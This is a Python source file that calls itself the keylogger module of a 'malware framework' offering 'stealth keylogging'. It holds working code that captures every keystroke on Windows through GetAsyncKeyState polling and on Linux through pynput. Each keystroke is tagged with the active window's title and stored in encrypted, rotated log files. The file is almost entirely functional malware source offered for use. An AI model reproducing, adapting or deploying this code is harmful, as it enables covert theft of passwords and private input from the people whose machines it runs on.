#!/usr/bin/env python3
"""
Keylogger Module for Malware Framework
Provides stealth keylogging capabilities
"""

import os
import sys
import time
import threading
from typing import Dict, Any, List, Optional
import logging
from pathlib import Path
import json
import subprocess

from core.base_payload import BasePayload
from core.encryption import EncryptionManager
from core.utils import SystemUtils, FileUtils

logger = logging.getLogger(__name__)

class Keylogger(BasePayload):
    """Keylogger payload implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize keylogger"""
        super().__init__(config)
        self.name = "Keylogger"
        self.description = "Stealth keylogger with encrypted logs"
        
        # Keylogger configuration
        self.log_file = config.get('log_file', 'keylog.txt')
        self.dump_interval = config.get('dump_interval', 60)  # seconds
        self.max_log_size = config.get('max_log_size', 1024 * 1024)  # 1MB
        self.encrypt_logs = config.get('encrypt_logs', True)
        self.include_timestamps = config.get('include_timestamps', True)
        self.include_window_info = config.get('include_window_info', True)
        
        # Keylogger state
        self.keys_buffer = []
        self.last_dump_time = time.time()
        self.log_path = None
        self.listener = None
        
        # Encryption for logs
        if self.encrypt_logs:
            self.encryption = EncryptionManager(config.get('encryption', {}))
        else:
            self.encryption = None
    
    def _initialize_payload(self) -> None:
        """Initialize keylogger specific components"""
        # Setup log file path
        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)
        self.log_path = log_dir / self.log_file
        
        # Initialize keylogger based on OS
        if SystemUtils.is_windows():
            self._init_windows_keylogger()
        else:
            self._init_linux_keylogger()
        
        logger.info(f"Keylogger initialized: {self.log_path}")
    
    def _init_windows_keylogger(self) -> None:
        """Initialize Windows keylogger"""
        try:
            import win32api
            import win32con
            import win32gui
            import win32process
            
            self.win32api = win32api
            self.win32con = win32con
            self.win32gui = win32gui
            self.win32process = win32process
            
            logger.info("Windows keylogger initialized")
        
        except ImportError:
            logger.error("win32api not available - Windows keylogger disabled")
            self.running = False
    
    def _init_linux_keylogger(self) -> None:
        """Initialize Linux keylogger"""
        try:
            import pynput
            self.pynput = pynput
            logger.info("Linux keylogger initialized")
        
        except ImportError:
            logger.error("pynput not available - Linux keylogger disabled")
            self.running = False
    
    def execute(self) -> bool:
        """Execute the keylogger"""
        try:
            if SystemUtils.is_windows():
                return self._execute_windows_keylogger()
            else:
                return self._execute_linux_keylogger()
        
        except Exception as e:
            logger.error(f"Keylogger execution failed: {e}")
            return False
    
    def _execute_windows_keylogger(self) -> bool:
        """Execute Windows keylogger"""
        try:
            # Start keylogger thread
            self.listener = threading.Thread(target=self._windows_keylogger_loop, daemon=True)
            self.listener.start()
            
            # Start dump thread
            dump_thread = threading.Thread(target=self._dump_loop, daemon=True)
            dump_thread.start()
            
            # Wait for threads
            self.listener.join()
            dump_thread.join()
            
            return True
        
        except Exception as e:
            logger.error(f"Windows keylogger failed: {e}")
            return False
    
    def _execute_linux_keylogger(self) -> bool:
        """Execute Linux keylogger"""
        try:
            # Start keylogger using pynput
            with self.pynput.keyboard.Listener(
                on_press=self._on_key_press,
                on_release=self._on_key_release
            ) as listener:
                self.listener = listener
                
                # Start dump thread
                dump_thread = threading.Thread(target=self._dump_loop, daemon=True)
                dump_thread.start()
                
                # Run listener
                listener.join()
                dump_thread.join()
            
            return True
        
        except Exception as e:
            logger.error(f"Linux keylogger failed: {e}")
            return False
    
    def _windows_keylogger_loop(self) -> None:
        """Windows keylogger main loop"""
        try:
            while self.running:
                # Check for key presses
                for i in range(256):
                    if self.win32api.GetAsyncKeyState(i) & 0x8000:
                        key_info = self._process_windows_key(i)
                        if key_info:
                            self.keys_buffer.append(key_info)
                
                time.sleep(0.01)  # 10ms delay
        
        except Exception as e:
            logger.error(f"Windows keylogger loop failed: {e}")
    
    def _process_windows_key(self, key_code: int) -> Optional[Dict[str, Any]]:
        """Process Windows key code"""
        try:
            # Convert key code to character
            key_char = chr(key_code) if 32 <= key_code <= 126 else None
            
            # Get window information
            window_info = self._get_active_window_info()
            
            key_info = {
                'key_code': key_code,
                'key_char': key_char,
                'timestamp': time.time(),
                'window': window_info
            }
            
            return key_info
        
        except Exception as e:
            logger.error(f"Failed to process Windows key: {e}")
            return None
    
    def _get_active_window_info(self) -> Dict[str, Any]:
        """Get active window information"""
        try:
            hwnd = self.win32gui.GetForegroundWindow()
            window_title = self.win32gui.GetWindowText(hwnd)
            
            # Get process information
            _, pid = self.win32process.GetWindowThreadProcessId(hwnd)
            
            return {
                'title': window_title,
                'pid': pid,
                'hwnd': hwnd
            }
        
        except Exception as e:
            logger.error(f"Failed to get window info: {e}")
            return {}
    
    def _on_key_press(self, key) -> None:
        """Handle key press (Linux)"""
        try:
            key_info = {
                'key': str(key),
                'action': 'press',
                'timestamp': time.time(),
                'window': self._get_linux_window_info()
            }
            
            self.keys_buffer.append(key_info)
        
        except Exception as e:
            logger.error(f"Failed to handle key press: {e}")
    
    def _on_key_release(self, key) -> None:
        """Handle key release (Linux)"""
        try:
            key_info = {
                'key': str(key),
                'action': 'release',
                'timestamp': time.time(),
                'window': self._get_linux_window_info()
            }
            
            self.keys_buffer.append(key_info)
        
        except Exception as e:
            logger.error(f"Failed to handle key release: {e}")
    
    def _get_linux_window_info(self) -> Dict[str, Any]:
        """Get active window information (Linux)"""
        try:
            # Try to get window info using xdotool
            result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                  capture_output=True, text=True, timeout=1)
            if result.returncode == 0:
                return {'title': result.stdout.strip()}
        except:
            pass
        
        return {}
    
    def _dump_loop(self) -> None:
        """Dump logs periodically"""
        try:
            while self.running:
                current_time = time.time()
                
                # Check if it's time to dump
                if current_time - self.last_dump_time >= self.dump_interval:
                    self._dump_logs()
                    self.last_dump_time = current_time
                
                time.sleep(1)
        
        except Exception as e:
            logger.error(f"Dump loop failed: {e}")
    
    def _dump_logs(self) -> None:
        """Dump buffered keys to log file"""
        try:
            if not self.keys_buffer:
                return
            
            # Prepare log data
            log_data = {
                'timestamp': time.time(),
                'keys': self.keys_buffer.copy()
            }
            
            # Clear buffer
            self.keys_buffer.clear()
            
            # Write to log file
            if self.encrypt_logs:
                self._write_encrypted_log(log_data)
            else:
                self._write_plain_log(log_data)
            
            logger.debug(f"Dumped {len(log_data['keys'])} keystrokes")
        
        except Exception as e:
            logger.error(f"Failed to dump logs: {e}")
    
    def _write_encrypted_log(self, log_data: Dict[str, Any]) -> None:
        """Write encrypted log data"""
        try:
            # Convert to JSON
            json_data = json.dumps(log_data, indent=2)
            
            # Encrypt data
            encrypted_data = self.encryption.encrypt(json_data.encode('utf-8'))
            
            # Write to file
            with open(self.log_path, 'ab') as f:
                f.write(encrypted_data + b'\n')
            
            # Check file size
            self._check_log_size()
        
        except Exception as e:
            logger.error(f"Failed to write encrypted log: {e}")
    
    def _write_plain_log(self, log_data: Dict[str, Any]) -> None:
        """Write plain text log data"""
        try:
            # Format log entries
            log_entries = []
            for key_info in log_data['keys']:
                entry = self._format_log_entry(key_info)
                log_entries.append(entry)
            
            # Write to file
            with open(self.log_path, 'a', encoding='utf-8') as f:
                for entry in log_entries:
                    f.write(entry + '\n')
            
            # Check file size
            self._check_log_size()
        
        except Exception as e:
            logger.error(f"Failed to write plain log: {e}")
    
    def _format_log_entry(self, key_info: Dict[str, Any]) -> str:
        """Format key info for log entry"""
        try:
            parts = []
            
            # Add timestamp
            if self.include_timestamps:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S', 
                                        time.localtime(key_info['timestamp']))
                parts.append(f"[{timestamp}]")
            
            # Add key information
            if 'key_char' in key_info and key_info['key_char']:
                parts.append(f"KEY: {key_info['key_char']}")
            elif 'key' in key_info:
                parts.append(f"KEY: {key_info['key']}")
            else:
                parts.append(f"CODE: {key_info.get('key_code', 'unknown')}")
            
            # Add window information
            if self.include_window_info and 'window' in key_info:
                window = key_info['window']
                if window.get('title'):
                    parts.append(f"WINDOW: {window['title']}")
            
            return ' | '.join(parts)
        
        except Exception as e:
            logger.error(f"Failed to format log entry: {e}")
            return str(key_info)
    
    def _check_log_size(self) -> None:
        """Check and rotate log file if too large"""
        try:
            if self.log_path.exists() and self.log_path.stat().st_size > self.max_log_size:
                # Create backup
                backup_path = self.log_path.with_suffix('.bak')
                if backup_path.exists():
                    backup_path.unlink()
                
                self.log_path.rename(backup_path)
                logger.info(f"Log file rotated: {self.log_path} -> {backup_path}")
        
        except Exception as e:
            logger.error(f"Failed to rotate log file: {e}")
    
    def _cleanup(self) -> None:
        """Cleanup keylogger resources"""
        try:
            # Stop listener
            if self.listener:
                if hasattr(self.listener, 'stop'):
                    self.listener.stop()
                self.listener = None
            
            # Dump remaining keys
            if self.keys_buffer:
                self._dump_logs()
            
            logger.info("Keylogger cleanup completed")
        
        except Exception as e:
            logger.error(f"Keylogger cleanup failed: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get keylogger status"""
        status = super().get_status()
        status.update({
            'log_file': str(self.log_path),
            'buffer_size': len(self.keys_buffer),
            'encrypt_logs': self.encrypt_logs,
            'dump_interval': self.dump_interval,
            'last_dump': self.last_dump_time
        })
        return status
    
    def get_log_stats(self) -> Dict[str, Any]:
        """Get keylogger statistics"""
        try:
            stats = {
                'total_keys': 0,
                'unique_keys': set(),
                'windows': set(),
                'start_time': self.start_time,
                'uptime': time.time() - self.start_time if self.start_time else 0
            }
            
            # Read log file
            if self.log_path and self.log_path.exists():
                if self.encrypt_logs:
                    # Read encrypted logs
                    with open(self.log_path, 'rb') as f:
                        for line in f:
                            try:
                                decrypted_data = self.encryption.decrypt(line.strip())
                                log_data = json.loads(decrypted_data.decode('utf-8'))
                                stats['total_keys'] += len(log_data['keys'])
                                
                                for key_info in log_data['keys']:
                                    if 'key_char' in key_info:
                                        stats['unique_keys'].add(key_info['key_char'])
                                    if 'window' in key_info and key_info['window'].get('title'):
                                        stats['windows'].add(key_info['window']['title'])
                            except:
                                continue
                else:
                    # Read plain logs
                    with open(self.log_path, 'r', encoding='utf-8') as f:
                        for line in f:
                            stats['total_keys'] += 1
            
            # Convert sets to lists for JSON serialization
            stats['unique_keys'] = list(stats['unique_keys'])
            stats['windows'] = list(stats['windows'])
            
            return stats
        
        except Exception as e:
            logger.error(f"Failed to get log stats: {e}")
            return {} 